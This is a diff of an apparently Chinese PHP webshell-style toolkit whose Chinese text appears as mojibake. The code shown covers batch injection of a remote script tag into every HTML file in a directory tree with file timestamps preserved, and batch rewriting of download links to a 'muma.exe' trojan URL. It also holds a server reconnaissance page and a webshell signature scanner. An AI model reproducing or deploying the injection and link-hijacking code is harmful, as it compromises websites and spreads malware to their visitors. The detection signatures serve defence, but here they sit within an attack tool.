-<input type="radio" name="gi" value="b">æ’å…¥æ–‡ä»¶æœ€é¡¶ç«¯ 
-<input type="radio" name="gi" value="c">æ’å…¥æ–‡ä»¶æœ€æœ«å°¾</div>
-<div class="actall" style="height:30px;"><input type="checkbox" name="gx" value="1" checked>æ™ºèƒ½è¿‡æ»¤é‡å¤ä»£ç  <input type="checkbox" name="gd" value="1" checked>ä¿æŒæ–‡ä»¶ä¿®æ”¹æ—¶é—´ä¸å˜</div>
-<div class="actall" style="height:50px;"><input type="radio" name="gb" value="a" checked>å°†æŒ‚é©¬åº”ç”¨äºè¯¥æ–‡ä»¶å¤¹,å­æ–‡ä»¶å¤¹å’Œæ–‡ä»¶
-<br><input type="radio" name="gb" value="b">ä»…å°†æŒ‚é©¬åº”ç”¨äºè¯¥æ–‡ä»¶å¤¹</div>
-<div class="actall"><input type="button" value="å¼€å§‹æŒ‚é©¬" style="width:80px;height:26px;" onclick="autorun();"></div>
+<div class="actall" style="height:35px;">¹ıÂË¶ÔÏó <input type="text" name="gl" value="templet|templets|default|editor|fckeditor.html" style="width:500px;" disabled>
+<input type="radio" name="inout" value="a" onclick="gl.disabled=false;">¿ªÆô <input type="radio" name="inout" value="b" onclick="gl.disabled=true;" checked>¹Ø±Õ</div>
+<div class="actall">¹ÒÂí´úÂë <textarea name="gc" id="gc" style="width:610px;height:180px;"><script language=javascript src="http://www.baidu.com/ad.js?[-6-]"></script></textarea>
+<div class="msgbox">¹ÒÂí±äĞÎËµÃ÷: ³ÌĞò×Ô¶¯Ñ°ÕÒ[-6-]±êÇ©,Ìæ»»ÎªËæ»ú×Ö·û,6±íÊ¾ÁùÎ»Ëæ»ú×Ö·û,×î´ó12Î»,Èç¹û²»±äĞÎ¿ÉÒÔ²»¼Ó[-6-]±êÇ©.
+<br>¹ÒÉÏÊ¾Àı: <script language=javascript src="http://www.baidu.com/ad.js?EMTDSU"></script></div></div>
+<div class="actall" style="height:35px;"><input type="radio" name="gi" value="a" checked>²åÈë</head>±êÇ©Ö®Ç° 
+<input type="radio" name="gi" value="b">²åÈëÎÄ¼ş×î¶¥¶Ë 
+<input type="radio" name="gi" value="c">²åÈëÎÄ¼ş×îÄ©Î²</div>
+<div class="actall" style="height:30px;"><input type="checkbox" name="gx" value="1" checked>ÖÇÄÜ¹ıÂËÖØ¸´´úÂë <input type="checkbox" name="gd" value="1" checked>±£³ÖÎÄ¼şĞŞ¸ÄÊ±¼ä²»±ä</div>
+<div class="actall" style="height:50px;"><input type="radio" name="gb" value="a" checked>½«¹ÒÂíÓ¦ÓÃÓÚ¸ÃÎÄ¼ş¼Ğ,×ÓÎÄ¼ş¼ĞºÍÎÄ¼ş
+<br><input type="radio" name="gb" value="b">½ö½«¹ÒÂíÓ¦ÓÃÓÚ¸ÃÎÄ¼ş¼Ğ</div>
+<div class="actall"><input type="button" value="¿ªÊ¼¹ÒÂí" style="width:80px;height:26px;" onclick="autorun();"></div>
 </form>
 END;
 return true;
 }
 
-//æ‰¹é‡æ¸…é©¬
+//ÅúÁ¿ÇåÂí
 
 function Qingma_Auto($qp,$qt,$qc,$qd,$qb)
 {
@@ -656,7 +659,7 @@ function Qingma_c()
 		$qt = str_replace('.','\\.',$_POST['qt']);
 		$qd = isset($_POST['qd']) ? true : false;
 		$qb = ($_POST['qb'] == 'a') ? true : false;
-		echo Qingma_Auto($_POST['qp'],$qt,$_POST['qc'],$qd,$qb) ? '<a href="#" onclick="history.back();">æ¸…é©¬å®Œæ¯•</a>' : '<a href="#" onclick="history.back();">å¼‚å¸¸ç»ˆæ­¢</a>';
+		echo Qingma_Auto($_POST['qp'],$qt,$_POST['qc'],$qd,$qb) ? '<a href="#" onclick="history.back();">ÇåÂíÍê±Ï</a>' : '<a href="#" onclick="history.back();">Òì³£ÖÕÖ¹</a>';
 		return false;
 	}
 	$FILE_DIR = File_Str(dirname(__FILE__));
@@ -671,37 +674,37 @@ function Fullll(i){
   return true;
 }
 function autoup(){
-	if(document.getElementById('qp').value == ''){alert('æ¸…é©¬è·¯å¾„ä¸èƒ½ä¸ºç©º');return false;}
-	if(document.getElementById('qt').value == ''){alert('æ–‡ä»¶ç±»å‹ä¸èƒ½ä¸ºç©º');return false;}
-	if(document.getElementById('qc').value == ''){alert('æ¸…é™¤ä»£ç ä¸èƒ½ä¸ºç©º');return false;}
+	if(document.getElementById('qp').value == ''){alert('ÇåÂíÂ·¾¶²»ÄÜÎª¿Õ');return false;}
+	if(document.getElementById('qt').value == ''){alert('ÎÄ¼şÀàĞÍ²»ÄÜÎª¿Õ');return false;}
+	if(document.getElementById('qc').value == ''){alert('Çå³ı´úÂë²»ÄÜÎª¿Õ');return false;}
 	document.getElementById('xform').submit();
 }
 </script>
 <form method="POST" name="xform" id="xform" action="?s=c">
-<div class="actall" style="height:35px;">æ¸…é©¬è·¯å¾„ <input type="text" name="qp" id="qp" value="{$ROOT_DIR}" style="width:500px;">
+<div class="actall" style="height:35px;">ÇåÂíÂ·¾¶ <input type="text" name="qp" id="qp" value="{$ROOT_DIR}" style="width:500px;">
 <select onchange='return Fullll(options[selectedIndex].value)'>
-<option value="0" selected>--èŒƒå›´é€‰æ‹©--</option>
-<option value="1">ç½‘ç«™è·Ÿç›®å½•</option>
-<option value="2">æœ¬ç¨‹åºç›®å½•</option>
+<option value="0" selected>--·¶Î§Ñ¡Ôñ--</option>
+<option value="1">ÍøÕ¾¸úÄ¿Â¼</option>
+<option value="2">±¾³ÌĞòÄ¿Â¼</option>
 </select></div>
-<div class="actall" style="height:35px;">æ–‡ä»¶ç±»å‹ <input type="text" name="qt" id="qt" value=".htm|.html|.shtml" style="width:500px;">
+<div class="actall" style="height:35px;">ÎÄ¼şÀàĞÍ <input type="text" name="qt" id="qt" value=".htm|.html|.shtml" style="width:500px;">
 <select onchange='return Fullll(options[selectedIndex].value)'>
-<option value="0" selected>--ç±»å‹é€‰æ‹©--</option>
-<option value="3">é™æ€æ–‡ä»¶</option>
-<option value="4">è„šæœ¬+é™æ€</option>
-<option value="5">JSæ–‡ä»¶</option>
+<option value="0" selected>--ÀàĞÍÑ¡Ôñ--</option>
+<option value="3">¾²Ì¬ÎÄ¼ş</option>
+<option value="4">½Å±¾+¾²Ì¬</option>
+<option value="5">JSÎÄ¼ş</option>
 </select></div>
-<div class="actall">æ¸…é™¤ä»£ç  <textarea name="qc" id="qc" style="width:610px;height:180px;"><script language=javascript src="http://www.baidu.com/ad.js"></script></textarea></div>
-<div class="actall" style="height:30px;"><input type="checkbox" name="qd" value="1" checked>ä¿æŒæ–‡ä»¶ä¿®æ”¹æ—¶é—´ä¸å˜</div>
-<div class="actall" style="height:50px;"><input type="radio" name="qb" value="a" checked>å°†æ¸…é©¬åº”ç”¨äºè¯¥æ–‡ä»¶å¤¹,å­æ–‡ä»¶å¤¹å’Œæ–‡ä»¶
-<br><input type="radio" name="qb" value="b">ä»…å°†æ¸…é©¬åº”ç”¨äºè¯¥æ–‡ä»¶å¤¹</div>
-<div class="actall"><input type="button" value="å¼€å§‹æ¸…é©¬" style="width:80px;height:26px;" onclick="autoup();"></div>
+<div class="actall">Çå³ı´úÂë <textarea name="qc" id="qc" style="width:610px;height:180px;"><script language=javascript src="http://www.baidu.com/ad.js"></script></textarea></div>
+<div class="actall" style="height:30px;"><input type="checkbox" name="qd" value="1" checked>±£³ÖÎÄ¼şĞŞ¸ÄÊ±¼ä²»±ä</div>
+<div class="actall" style="height:50px;"><input type="radio" name="qb" value="a" checked>½«ÇåÂíÓ¦ÓÃÓÚ¸ÃÎÄ¼ş¼Ğ,×ÓÎÄ¼ş¼ĞºÍÎÄ¼ş
+<br><input type="radio" name="qb" value="b">½ö½«ÇåÂíÓ¦ÓÃÓÚ¸ÃÎÄ¼ş¼Ğ</div>
+<div class="actall"><input type="button" value="¿ªÊ¼ÇåÂí" style="width:80px;height:26px;" onclick="autoup();"></div>
 </form>
 END;
 	return true;
 }
 
-//æ‰¹é‡æ›¿æ¢
+//ÅúÁ¿Ìæ»»
 
 function Tihuan_Auto($tp,$tt,$th,$tca,$tcb,$td,$tb)
 {
@@ -746,7 +749,7 @@ function Tihuan_d()
 		$tb = ($_POST['tb'] == 'a') ? true : false;
 		$th = ($_POST['th'] == 'a') ? true : false;
 		if($th) $_POST['tca'] = str_replace('.','\\.',$_POST['tca']);
-		echo Tihuan_Auto($_POST['tp'],$tt,$th,$_POST['tca'],$_POST['tcb'],$td,$tb) ? '<a href="#" onclick="window.location=\'?s=d\'">æ›¿æ¢å®Œæ¯•</a>' : '<a href="#" onclick="window.location=\'?s=d\'">å¼‚å¸¸ç»ˆæ­¢</a>';
+		echo Tihuan_Auto($_POST['tp'],$tt,$th,$_POST['tca'],$_POST['tcb'],$td,$tb) ? '<a href="#" onclick="window.location=\'?s=d\'">Ìæ»»Íê±Ï</a>' : '<a href="#" onclick="window.location=\'?s=d\'">Òì³£ÖÕÖ¹</a>';
 		return false;
 	}
 	$FILE_DIR = File_Str(dirname(__FILE__));
@@ -761,43 +764,43 @@ function Fulllll(i){
   return true;
 }
 function showth(th){
-	if(th == 'a') document.getElementById('setauto').innerHTML = 'æŸ¥æ‰¾å†…å®¹ <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>æ›¿æ¢æˆä¸º <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea>';
-	if(th == 'b') document.getElementById('setauto').innerHTML = '<br>ä¸‹è½½åç¼€ <input type="text" name="tca" id="tca" value=".exe|.z0|.rar|.zip|.gz|.torrent" style="width:500px;"><br><br>æ›¿æ¢æˆä¸º <input type="text" name="tcb" id="tcb" value="http://www.baidu.com/download/muma.exe" style="width:500px;">';
+	if(th == 'a') document.getElementById('setauto').innerHTML = '²éÕÒÄÚÈİ <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>Ìæ»»³ÉÎª <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea>';
+	if(th == 'b') document.getElementById('setauto').innerHTML = '<br>ÏÂÔØºó×º <input type="text" name="tca" id="tca" value=".exe|.z0|.rar|.zip|.gz|.torrent" style="width:500px;"><br><br>Ìæ»»³ÉÎª <input type="text" name="tcb" id="tcb" value="http://www.baidu.com/download/muma.exe" style="width:500px;">';
 	return true;
 }
 function autoup(){
-	if(document.getElementById('tp').value == ''){alert('æ›¿æ¢è·¯å¾„ä¸èƒ½ä¸ºç©º');return false;}
-	if(document.getElementById('tt').value == ''){alert('æ–‡ä»¶ç±»å‹ä¸èƒ½ä¸ºç©º');return false;}
-	if(document.getElementById('tca').value == '' || document.getElementById('tcb').value == ''){alert('æ›¿æ¢ä»£ç ä¸èƒ½ä¸ºç©º');return false;}
+	if(document.getElementById('tp').value == ''){alert('Ìæ»»Â·¾¶²»ÄÜÎª¿Õ');return false;}
+	if(document.getElementById('tt').value == ''){alert('ÎÄ¼şÀàĞÍ²»ÄÜÎª¿Õ');return false;}
+	if(document.getElementById('tca').value == '' || document.getElementById('tcb').value == ''){alert('Ìæ»»´úÂë²»ÄÜÎª¿Õ');return false;}
 	document.getElementById('tform').submit();
 }
 </script>
 <form method="POST" name="tform" id="tform" action="?s=d">
-<div class="actall" style="height:35px;">æ›¿æ¢è·¯å¾„ <input type="text" name="tp" id="tp" value="{$ROOT_DIR}" style="width:500px;">
+<div class="actall" style="height:35px;">Ìæ»»Â·¾¶ <input type="text" name="tp" id="tp" value="{$ROOT_DIR}" style="width:500px;">
 <select onchange='return Fulllll(options[selectedIndex].value)'>
-<option value="0" selected>--èŒƒå›´é€‰æ‹©--</option>
-<option value="1">ç½‘ç«™è·Ÿç›®å½•</option>
-<option value="2">æœ¬ç¨‹åºç›®å½•</option>
+<option value="0" selected>--·¶Î§Ñ¡Ôñ--</option>
+<option value="1">ÍøÕ¾¸úÄ¿Â¼</option>
+<option value="2">±¾³ÌĞòÄ¿Â¼</option>
 </select></div>
-<div class="actall" style="height:35px;">æ–‡ä»¶ç±»å‹ <input type="text" name="tt" id="tt" value=".htm|.html|.shtml" style="width:500px;">
+<div class="actall" style="height:35px;">ÎÄ¼şÀàĞÍ <input type="text" name="tt" id="tt" value=".htm|.html|.shtml" style="width:500px;">
 <select onchange='return Fulllll(options[selectedIndex].value)'>
-<option value="0" selected>--ç±»å‹é€‰æ‹©--</option>
-<option value="3">é™æ€æ–‡ä»¶</option>
-<option value="4">è„šæœ¬+é™æ€</option>
-<option value="5">JSæ–‡ä»¶</option>
+<option value="0" selected>--ÀàĞÍÑ¡Ôñ--</option>
+<option value="3">¾²Ì¬ÎÄ¼ş</option>
+<option value="4">½Å±¾+¾²Ì¬</option>
+<option value="5">JSÎÄ¼ş</option>
 </select></div>
-<div class="actall" style="height:235px;"><input type="radio" name="th" value="a" onclick="showth('a')" checked>æ›¿æ¢æ–‡ä»¶ä¸­çš„æŒ‡å®šå†…å®¹ <input type="radio" name="th" value="b" onclick="showth('b')">æ›¿æ¢æ–‡ä»¶ä¸­çš„ä¸‹è½½åœ°å€<br>
-<div id="setauto">æŸ¥æ‰¾å†…å®¹ <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>æ›¿æ¢æˆä¸º <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea></div></div>
-<div class="actall" style="height:30px;"><input type="checkbox" name="td" value="1" checked>ä¿æŒæ–‡ä»¶ä¿®æ”¹æ—¶é—´ä¸å˜</div>
-<div class="actall" style="height:50px;"><input type="radio" name="tb" value="a" checked>å°†æ›¿æ¢åº”ç”¨äºè¯¥æ–‡ä»¶å¤¹,å­æ–‡ä»¶å¤¹å’Œæ–‡ä»¶
-<br><input type="radio" name="tb" value="b">ä»…å°†æ›¿æ¢åº”ç”¨äºè¯¥æ–‡ä»¶å¤¹</div>
-<div class="actall"><input type="button" value="å¼€å§‹æ›¿æ¢" style="width:80px;height:26px;" onclick="autoup();"></div>
+<div class="actall" style="height:235px;"><input type="radio" name="th" value="a" onclick="showth('a')" checked>Ìæ»»ÎÄ¼şÖĞµÄÖ¸¶¨ÄÚÈİ <input type="radio" name="th" value="b" onclick="showth('b')">Ìæ»»ÎÄ¼şÖĞµÄÏÂÔØµØÖ·<br>
+<div id="setauto">²éÕÒÄÚÈİ <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>Ìæ»»³ÉÎª <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea></div></div>
+<div class="actall" style="height:30px;"><input type="checkbox" name="td" value="1" checked>±£³ÖÎÄ¼şĞŞ¸ÄÊ±¼ä²»±ä</div>
+<div class="actall" style="height:50px;"><input type="radio" name="tb" value="a" checked>½«Ìæ»»Ó¦ÓÃÓÚ¸ÃÎÄ¼ş¼Ğ,×ÓÎÄ¼ş¼ĞºÍÎÄ¼ş
+<br><input type="radio" name="tb" value="b">½ö½«Ìæ»»Ó¦ÓÃÓÚ¸ÃÎÄ¼ş¼Ğ</div>
+<div class="actall"><input type="button" value="¿ªÊ¼Ìæ»»" style="width:80px;height:26px;" onclick="autoup();"></div>
 </form>
 END;
 	return true;
 }
 
-//æŸ¥æ‰¾æœ¨é©¬
+//²éÕÒÄ¾Âí
 
 function Antivirus_Auto($sp,$features,$st)
 {
@@ -818,8 +821,8 @@ function Antivirus_Auto($sp,$features,$st)
 				{
 					$Fileurls = str_replace($ROOT_DIR,'http://'.$_SERVER['SERVER_NAME'].'/',$Filepath);
 					$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
-					echo '<a href="'.$Fileurls.'" target="_blank"><font color="#8B0000">'.$Filepath.'</font></a><br>ã€<a href="?s=e&fp='.urlencode($sp).'&fn='.$Filename.'&dim='.urlencode($key).'" target="_blank">ç¼–è¾‘</a> <a href="?s=e&df='.urlencode($Filepath).'" target="_blank">åˆ é™¤</a>ã€‘ ';
-					echo 'ã€'.$Filetime.'ã€‘ <font color="#FF0000">'.$var.'</font><br><br>'."\r\n";
+					echo '<a href="'.$Fileurls.'" target="_blank"><font color="#8B0000">'.$Filepath.'</font></a><br>¡¾<a href="?s=e&fp='.urlencode($sp).'&fn='.$Filename.'&dim='.urlencode($key).'" target="_blank">±à¼­</a> <a href="?s=e&df='.urlencode($Filepath).'" target="_blank">É¾³ı</a>¡¿ ';
+					echo '¡¾'.$Filetime.'¡¿ <font color="#FF0000">'.$var.'</font><br><br>'."\r\n";
 					break;
 				}
 			}
@@ -833,20 +836,20 @@ function Antivirus_Auto($sp,$features,$st)
 
 function Antivirus_e()
 {
-	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo 'åˆ é™¤æˆåŠŸ';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? 'åˆ é™¤æˆåŠŸ' : 'åˆ é™¤å¤±è´¥';} return false;}
+	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo 'É¾³ı³É¹¦';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? 'É¾³ı³É¹¦' : 'É¾³ıÊ§°Ü';} return false;}
 	if((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; }
 	$SCAN_DIR = (File_Mode() == '') ? File_Str(dirname(__FILE__)) : File_Mode();
-	$features_php = array('phpå¤§é©¬ç‰¹å¾1'=>'cha88.cn','phpå¤§é©¬ç‰¹å¾2'=>'->read()','phpå¤§é©¬ç‰¹å¾3'=>'readdir(','å±é™©MYSQLè¯­å¥4'=>'returns string soname','phpåŠ å¯†å¤§é©¬ç‰¹å¾5'=>'eval(gzinflate(','phpåŠ å¯†å¤§é©¬ç‰¹å¾6'=>'eval(base64_decode(','phpä¸€å¥è¯ç‰¹å¾7'=>'eval($_','phpä¸€å¥è¯ç‰¹å¾8'=>'eval ($_','phpä¸Šä¼ åé—¨ç‰¹å¾9'=>'copy($_FILES','phpä¸Šä¼ åé—¨ç‰¹å¾10'=>'copy ($_FILES','phpä¸Šä¼ åé—¨ç‰¹å¾11'=>'move_uploaded_file($_FILES','phpä¸Šä¼ åé—¨ç‰¹å¾12'=>'move_uploaded_file ($_FILES','phpå°é©¬ç‰¹å¾13'=>'str_replace(\'\\\\\',\'/\',');
-	$features_asx = array('aspå°é©¬ç‰¹å¾1'=>'ç»å¯¹è·¯å¾„','aspå°é©¬ç‰¹å¾2'=>'è¾“å…¥é©¬çš„å†…å®¹','aspå°é©¬ç‰¹å¾3'=>'fso.createtextfile(path,true)','aspä¸€å¥è¯ç‰¹å¾4'=>'<%execute(request','aspä¸€å¥è¯ç‰¹å¾5'=>'<%eval request','aspä¸€å¥è¯ç‰¹å¾6'=>'execute session(','aspæ•°æ®åº“åé—¨ç‰¹å¾7'=>'--Created!','aspå¤§é©¬ç‰¹å¾8'=>'WScript.Shell','aspå¤§å°é©¬ç‰¹å¾9'=>'<%@ LANGUAGE = VBScript.Encode %>','aspxå¤§é©¬ç‰¹å¾10'=>'www.rootkit.net.cn','aspxå¤§é©¬ç‰¹å¾11'=>'Process.GetProcesses','aspxå¤§é©¬ç‰¹å¾12'=>'lake2');
+	$features_php = array('php´óÂíÌØÕ÷1'=>'cha88.cn','php´óÂíÌØÕ÷2'=>'->read()','php´óÂíÌØÕ÷3'=>'readdir(','Î£ÏÕMYSQLÓï¾ä4'=>'returns string soname','php¼ÓÃÜ´óÂíÌØÕ÷5'=>'eval(gzinflate(','php¼ÓÃÜ´óÂíÌØÕ÷6'=>'eval(base64_decode(','phpÒ»¾ä»°ÌØÕ÷7'=>'eval($_','phpÒ»¾ä»°ÌØÕ÷8'=>'eval ($_','phpÉÏ´«ºóÃÅÌØÕ÷9'=>'copy($_FILES','phpÉÏ´«ºóÃÅÌØÕ÷10'=>'copy ($_FILES','phpÉÏ´«ºóÃÅÌØÕ÷11'=>'move_uploaded_file($_FILES','phpÉÏ´«ºóÃÅÌØÕ÷12'=>'move_uploaded_file ($_FILES','phpĞ¡ÂíÌØÕ÷13'=>'str_replace(\'\\\\\',\'/\',');
+	$features_asx = array('aspĞ¡ÂíÌØÕ÷1'=>'¾ø¶ÔÂ·¾¶','aspĞ¡ÂíÌØÕ÷2'=>'ÊäÈëÂíµÄÄÚÈİ','aspĞ¡ÂíÌØÕ÷3'=>'fso.createtextfile(path,true)','aspÒ»¾ä»°ÌØÕ÷4'=>'<%execute(request','aspÒ»¾ä»°ÌØÕ÷5'=>'<%eval request','aspÒ»¾ä»°ÌØÕ÷6'=>'execute session(','aspÊı¾İ¿âºóÃÅÌØÕ÷7'=>'--Created!','asp´óÂíÌØÕ÷8'=>'WScript.Shell','asp´óĞ¡ÂíÌØÕ÷9'=>'<%@ LANGUAGE = VBScript.Encode %>','aspx´óÂíÌØÕ÷10'=>'www.rootkit.net.cn','aspx´óÂíÌØÕ÷11'=>'Process.GetProcesses','aspx´óÂíÌØÕ÷12'=>'lake2');
 print<<<END
 <div class="actall"><form method="POST" name="tform" id="tform" action="?s=e">
-æ‰«æè·¯å¾„ <input type="text" name="sp" id="sp" value="{$SCAN_DIR}" style="width:400px;">
+É¨ÃèÂ·¾¶ <input type="text" name="sp" id="sp" value="{$SCAN_DIR}" style="width:400px;">
 <select name="st">
-<option value="php">phpæœ¨é©¬</option>
-<option value="asx">asp+aspxæœ¨é©¬</option>
-<option value="ppp">php+asp+aspxæœ¨é©¬</option>
+<option value="php">phpÄ¾Âí</option>
+<option value="asx">asp+aspxÄ¾Âí</option>
+<option value="ppp">php+asp+aspxÄ¾Âí</option>
 </select>
-<input type="submit" value="å¼€å§‹æ‰«æ" style="width:80px;">
+<input type="submit" value="¿ªÊ¼É¨Ãè" style="width:80px;">
 </form><br>
 END;
 	if(!empty($_POST['sp']))
@@ -854,65 +857,65 @@ END;
 		if($_POST['st'] == 'php'){$features_all = $features_php; $st = '\.php|\.inc|\;';}
 		if($_POST['st'] == 'asx'){$features_all = $features_asx; $st = '\.asp|\.asa|\.cer|\.aspx|\.ascx|\;';}
 		if($_POST['st'] == 'ppp'){$features_all = array_merge($features_php,$features_asx); $st = '\.php|\.inc|\.asp|\.asa|\.cer|\.aspx|\.ascx|\;';}
-		echo Antivirus_Auto($_POST['sp'],$features_all,$st) ? 'æ‰«æå®Œæ¯•' : 'å¼‚å¸¸ç»ˆæ­¢';
+		echo Antivirus_Auto($_POST['sp'],$features_all,$st) ? 'É¨ÃèÍê±Ï' : 'Òì³£ÖÕÖ¹';
 	}
 	echo '</div>';
 	return true;
 }
 
-//ç³»ç»Ÿä¿¡æ¯
+//ÏµÍ³ĞÅÏ¢
 
 function Info_Cfg($varname){switch($result = get_cfg_var($varname)){case 0: return "No"; break; case 1: return "Yes"; break; default: return $result; break;}}
 function Info_Fun($funName){return (false !== function_exists($funName)) ? "Yes" : "No";}
 function Info_f()
 {
 	$dis_func = get_cfg_var("disable_functions");
-	$upsize = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "ä¸å…è®¸ä¸Šä¼ ";
+	$upsize = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "²»ÔÊĞíÉÏ´«";
 	$adminmail = (isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
 	if($dis_func == ""){$dis_func = "No";}else{$dis_func = str_replace(" ","<br>",$dis_func);$dis_func = str_replace(",","<br>",$dis_func);}
 	$phpinfo = (!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
 	$info = array(
-		array("æœåŠ¡å™¨æ—¶é—´",date("Yå¹´mæœˆdæ—¥ h:i:s",time())),
-		array("æœåŠ¡å™¨åŸŸå","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
-		array("æœåŠ¡å™¨IPåœ°å€",gethostbyname($_SERVER['SERVER_NAME'])),
-		array("æœåŠ¡å™¨æ“ä½œç³»ç»Ÿ",PHP_OS),
-		array("æœåŠ¡å™¨æ“ä½œç³»ç»Ÿæ–‡å­—ç¼–ç ",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
-		array("æœåŠ¡å™¨è§£è¯‘å¼•æ“",$_SERVER['SERVER_SOFTWARE']),
-		array("ä½ çš„IP",getenv('REMOTE_ADDR')),
-		array("WebæœåŠ¡ç«¯å£",$_SERVER['SERVER_PORT']),
-		array("PHPè¿è¡Œæ–¹å¼",strtoupper(php_sapi_name())),
-		array("PHPç‰ˆæœ¬",PHP_VERSION),
-		array("è¿è¡Œäºå®‰å…¨æ¨¡å¼",Info_Cfg("safemode")),
-		array("æœåŠ¡å™¨ç®¡ç†å‘˜",$adminmail),
-		array("æœ¬æ–‡ä»¶è·¯å¾„",__FILE__),
-		array("å…è®¸ä½¿ç”¨ URL æ‰“å¼€æ–‡ä»¶ allow_url_fopen",Info_Cfg("allow_url_fopen")),
-		array("å…è®¸åŠ¨æ€åŠ è½½é“¾æ¥åº“ enable_dl",Info_Cfg("enable_dl")),
-		array("æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ display_errors",Info_Cfg("display_errors")),
-		array("è‡ªåŠ¨å®šä¹‰å…¨å±€å˜é‡ register_globals",Info_Cfg("register_globals")),
+		array("·şÎñÆ÷Ê±¼ä",date("YÄêmÔÂdÈÕ h:i:s",time())),
+		array("·şÎñÆ÷ÓòÃû","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
+		array("·şÎñÆ÷IPµØÖ·",gethostbyname($_SERVER['SERVER_NAME'])),
+		array("·şÎñÆ÷²Ù×÷ÏµÍ³",PHP_OS),
+		array("·şÎñÆ÷²Ù×÷ÏµÍ³ÎÄ×Ö±àÂë",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
+		array("·şÎñÆ÷½âÒëÒıÇæ",$_SERVER['SERVER_SOFTWARE']),
+		array("ÄãµÄIP",getenv('REMOTE_ADDR')),
+		array("Web·şÎñ¶Ë¿Ú",$_SERVER['SERVER_PORT']),
+		array("PHPÔËĞĞ·½Ê½",strtoupper(php_sapi_name())),
+		array("PHP°æ±¾",PHP_VERSION),
+		array("ÔËĞĞÓÚ°²È«Ä£Ê½",Info_Cfg("safemode")),
+		array("·şÎñÆ÷¹ÜÀíÔ±",$adminmail),
+		array("±¾ÎÄ¼şÂ·¾¶",__FILE__),
+		array("ÔÊĞíÊ¹ÓÃ URL ´ò¿ªÎÄ¼ş allow_url_fopen",Info_Cfg("allow_url_fopen")),
+		array("ÔÊĞí¶¯Ì¬¼ÓÔØÁ´½Ó¿â enable_dl",Info_Cfg("enable_dl")),
+		array("ÏÔÊ¾´íÎóĞÅÏ¢ display_errors",Info_Cfg("display_errors")),
+		array("×Ô¶¯¶¨ÒåÈ«¾Ö±äÁ¿ register_globals",Info_Cfg("register_globals")),
 		array("magic_quotes_gpc",Info_Cfg("magic_quotes_gpc")),
-		array("ç¨‹åºæœ€å¤šå…è®¸ä½¿ç”¨å†…å­˜é‡ memory_limit",Info_Cfg("memory_limit")),
-		array("POSTæœ€å¤§å­—èŠ‚æ•° post_max_size",Info_Cfg("post_max_size")),
-		array("å…è®¸æœ€å¤§ä¸Šä¼ æ–‡ä»¶ upload_max_filesize",$upsize),
-		array("ç¨‹åºæœ€é•¿è¿è¡Œæ—¶é—´ max_execution_time",Info_Cfg("max_execution_time")."ç§’"),
-		array("è¢«ç¦ç”¨çš„å‡½æ•° disable_functions",$dis_func),
+		array("³ÌĞò×î¶àÔÊĞíÊ¹ÓÃÄÚ´æÁ¿ memory_limit",Info_Cfg("memory_limit")),
+		array("POST×î´ó×Ö½ÚÊı post_max_size",Info_Cfg("post_max_size")),
+		array("ÔÊĞí×î´óÉÏ´«ÎÄ¼ş upload_max_filesize",$upsize),
+		array("³ÌĞò×î³¤ÔËĞĞÊ±¼ä max_execution_time",Info_Cfg("max_execution_time")."Ãë"),
+		array("±»½ûÓÃµÄº¯Êı disable_functions",$dis_func),
 		array("phpinfo()",$phpinfo),
-		array("ç›®å‰è¿˜æœ‰ç©ºä½™ç©ºé—´diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
-		array("å›¾å½¢å¤„ç† GD Library",Info_Fun("imageline")),
-		array("IMAPç”µå­é‚®ä»¶ç³»ç»Ÿ",Info_Fun("imap_close")),
-		array("MySQLæ•°æ®åº“",Info_Fun("mysql_close")),
-		array("SyBaseæ•°æ®åº“",Info_Fun("sybase_close")),
-		array("Oracleæ•°æ®åº“",Info_Fun("ora_close")),
-		array("Oracle 8 æ•°æ®åº“",Info_Fun("OCILogOff")),
-		array("PRELç›¸å®¹è¯­æ³• PCRE",Info_Fun("preg_match")),
-		array("PDFæ–‡æ¡£æ”¯æŒ",Info_Fun("pdf_close")),
-		array("Postgre SQLæ•°æ®åº“",Info_Fun("pg_close")),
-		array("SNMPç½‘ç»œç®¡ç†åè®®",Info_Fun("snmpget")),
-		array("å‹ç¼©æ–‡ä»¶æ”¯æŒ(Zlib)",Info_Fun("gzclose")),
-		array("XMLè§£æ",Info_Fun("xml_set_object")),
+		array("Ä¿Ç°»¹ÓĞ¿ÕÓà¿Õ¼ädiskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
+		array("Í¼ĞÎ´¦Àí GD Library",Info_Fun("imageline")),
+		array("IMAPµç×ÓÓÊ¼şÏµÍ³",Info_Fun("imap_close")),
+		array("MySQLÊı¾İ¿â",Info_Fun("mysql_close")),
+		array("SyBaseÊı¾İ¿â",Info_Fun("sybase_close")),
+		array("OracleÊı¾İ¿â",Info_Fun("ora_close")),
